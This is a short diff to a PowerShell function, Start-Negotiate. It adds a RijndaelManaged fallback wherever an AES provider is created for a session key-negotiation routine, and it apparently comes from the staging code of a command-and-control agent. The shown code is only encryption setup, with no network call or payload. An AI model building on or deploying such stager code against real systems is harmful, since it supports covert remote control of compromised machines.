@@ -38,7 +38,12 @@ function Start-Negotiate {
 
             # extract the IV
             $IV = $In[0..15];
-            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+           try {
+                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            }
+            catch {
+                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+            }
             $AES.Mode = "CBC";
             $AES.Key = $e.GetBytes($Key);
             $AES.IV = $IV;
@@ -57,7 +62,13 @@ function Start-Negotiate {
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
-    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+    try {
+        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+    }
+    catch {
+        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+    }
+    
     $IV = [byte] 0..255 | Get-Random -count 16;
     $AES.Mode="CBC";
     $AES.Key=$SKB;
@@ -126,7 +137,12 @@ function Start-Negotiate {
     $nonce=[String]([long]$nonce + 1);
 
     # create a new AES object
-    $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+    try {
+        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+    }
+    catch {
+        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+    }
     $IV = [byte] 0..255 | Get-Random -Count 16;
     $AES.Mode="CBC";
     $AES.Key=$e.GetBytes($key);
